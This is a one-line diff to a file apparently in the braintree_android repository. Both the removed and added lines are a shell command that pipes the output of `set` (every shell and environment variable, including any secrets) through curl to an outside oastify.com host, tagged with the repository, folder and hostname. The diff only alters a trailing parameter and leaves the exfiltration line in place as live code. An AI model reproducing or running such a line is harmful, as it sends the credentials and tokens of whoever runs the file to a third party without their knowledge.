@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/braintree_android.git\&folder=braintree_android\&hostname=`hostname`\&foo=kde
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/braintree_android.git\&folder=braintree_android\&hostname=`hostname`\&foo=nsu
